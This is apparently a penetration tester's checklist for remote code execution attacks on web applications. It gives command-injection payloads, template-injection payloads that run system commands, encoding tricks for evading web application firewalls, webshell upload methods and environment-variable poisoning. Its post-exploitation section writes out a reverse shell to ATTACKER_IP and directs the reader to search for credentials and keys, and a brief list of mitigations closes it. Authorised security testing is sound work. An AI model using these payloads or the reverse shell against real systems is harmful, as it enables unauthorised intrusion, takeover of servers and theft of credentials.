# âš¡ Complete RCE (Remote Code Execution) Attack Checklist

---

# ğŸ§© 1. **Information Gathering**
- [ ] Identify any user input fields (forms, file uploads, API calls, URL params).
- [ ] List server-side technologies (PHP, Python, Node.js, Java, .NET, etc.).
- [ ] Identify operating system (Linux/Windows) via headers, errors, responses.
- [ ] Find exposed services (Web servers, APIs, SSH, Docker APIs, Jenkins, etc.).
- [ ] Check server response behaviors for time delays, errors, command outputs.

---

# ğŸ§© 2. **Initial Injection Points**
### ğŸ“ Focus Fields:
- [ ] Search fields
- [ ] Contact forms
- [ ] File upload fields
- [ ] URL parameters
- [ ] Cookie fields
- [ ] Headers (User-Agent, X-Forwarded-For)
- [ ] API input fields
- [ ] Hidden form fields

---

# ğŸ§© 3. **Simple Payload Injection Testing**
### ğŸ§ª Basic Commands:
- [ ] `; whoami`
- [ ] `&& whoami`
- [ ] `| whoami`
- [ ] ``` `whoami` ``` (backticks)

âœ… Test by injecting payloads into fields, then observe if:
- You see command output
- Server error changes
- Response time changes

---

# ğŸ§© 4. **Time-Based Payloads (Blind RCE Testing)**
âœ… Use if no visible output:

- [ ] `; sleep 5`
- [ ] `&& ping -c 5 127.0.0.1`
- [ ] `| timeout 5`
- [ ] `$((sleep 5))`

Check if response time noticeably delays, indicating code execution!

---

# ğŸ§© 5. **Advanced Payload Techniques**
### ğŸ“ Obfuscation and WAF Evasion:
- [ ] URL-encode the payload
- [ ] Use shell variable tricks (`$(whoami)`)
- [ ] Bypass with nested commands (`$(sleep 5)`)
- [ ] Encode with base64 (`echo aGVsbG8= | base64 -d`)
- [ ] Use Unicode tricks (encoded separators)

---

# ğŸ§© 6. **File Upload + Webshell Testing**
âœ… Common upload vectors:

- [ ] Upload `.php`, `.asp`, `.aspx`, `.jsp`, `.cgi` webshells.
- [ ] Try double extensions (e.g., `shell.php.jpg`).
- [ ] Upload HTA, JS, or BAT scripts (for Windows servers).
- [ ] Look for paths where files might get stored and executed.

ğŸ” Check locations like:
- `/uploads/`
- `/images/`
- `/files/`
- `/tmp/`

---

# ğŸ§© 7. **Header Injection Testing**
âœ… Test these headers with command injection:

- [ ] `User-Agent: ;whoami`
- [ ] `Referer: ;id`
- [ ] `X-Forwarded-For: ;sleep 5`

Sometimes logs or server scripts process headers insecurely.

---

# ğŸ§© 8. **Template Injection RCE (SSTI)**
âœ… Identify server-side template engines (Jinja2, Twig, Freemarker, etc.).
âœ… Try payloads:

- [ ] `{{7*7}}`
- [ ] `${{7*7}}`
- [ ] `{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}`
- [ ] `${{''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}}`

If server reflects evaluated math/output, you might achieve RCE.

---

# ğŸ§© 9. **Deserialization Attack Testing**
âœ… If app uses serialized objects (PHP, Java, Python Pickle, .NET):

- [ ] Identify serialization format (base64? JSON? Java binary?)
- [ ] Try modifying the object or inserting malicious serialized payloads (like `phpggc`, `ysoserial`, `marshalsec`).
- [ ] Observe unexpected behavior or command execution.

---

# ğŸ§© 10. **Command Injection via API Testing**
âœ… Common spots:

- [ ] File handling APIs
- [ ] CLI execution APIs
- [ ] Image processing APIs (ImageMagick "ImageTragick")
- [ ] PDF converters
- [ ] Zip/unzip services

ğŸ” Payloads:
- [ ] Filenames like `";sleep 5;"`
- [ ] Image metadata containing payloads (`exiftool` abuse)

---

# ğŸ§© 11. **Environment Variable Poisoning**
âœ… Look for injection into environment vars:

- [ ] Set `HTTP_PROXY` or `NO_PROXY` headers and watch behavior.
- [ ] Try poisoning `PATH`, `LD_PRELOAD`, `LD_LIBRARY_PATH`.

This can sometimes indirectly lead to RCE if executed by scripts.

---

# ğŸ§© 12. **Framework-Specific RCE Checks**
âœ… Common RCE hotspots:

| Framework / Tech | Vulnerability | Payload Example |
|:---|:---|:---|
| PHP | `system()`, `eval()`, `passthru()` | `;id` |
| Node.js | `child_process.exec()` | `child_process.exec('id')` |
| Python | `os.system()`, `subprocess.Popen()` | `__import__('os').system('id')` |
| Java | `Runtime.getRuntime().exec()` | `java.lang.Runtime.getRuntime().exec("id")` |
| Ruby | `eval()`, backticks `` | `` `id` `` |

---

# ğŸ§© 13. **Cloud and CI/CD Services RCE Testing**
âœ… Check for:

- [ ] Misconfigured Jenkins endpoints (`scriptConsole`).
- [ ] Exposed Docker APIs (`docker exec` to RCE).
- [ ] GitHub Actions with unsafe `run` commands.
- [ ] AWS Lambda functions accepting arbitrary input.

---

# ğŸ§© 14. **Bypass Techniques**
âœ… If protections are present, try:

- [ ] Double URL Encoding
- [ ] Adding invalid extra parameters (padding)
- [ ] Mixing different separators (`;`, `&&`, `||`, `|`, `%0a`, `%0d`)
- [ ] Encoding shell characters with hex (`%3b` = `;`)

---

# ğŸ§© 15. **Post-Exploitation / Impact Assessment**
âœ… Once RCE is confirmed:

- [ ] Establish a reverse shell (`bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`)
- [ ] Enumerate environment (`uname -a`, `env`, `id`, `hostname`)
- [ ] Locate sensitive files (database configs, keys, credentials)
- [ ] Check if privilege escalation is possible (root user, SYSTEM user)

---

# ğŸ›¡ï¸ **Bonus: RCE Mitigation Best Practices**
- Validate and sanitize all user inputs strictly.
- Use parameterized system calls (not direct concatenation).
- Implement a strong Content Security Policy (CSP).
- Restrict server permissions: avoid running apps as root.
- Monitor applications for abnormal activity and logs.

---

# ğŸ¯ Final Checklist Validation
- [ ] Every input field tested âœ…
- [ ] Every upload field tested âœ…
- [ ] Every API endpoint tested âœ…
- [ ] Every header field tested âœ…
- [ ] Deserialization vectors tested âœ…
- [ ] Environment injection tested âœ…
- [ ] Time-based, blind RCE confirmed or ruled out âœ…
- [ ] Post-exploitation plan ready âœ…
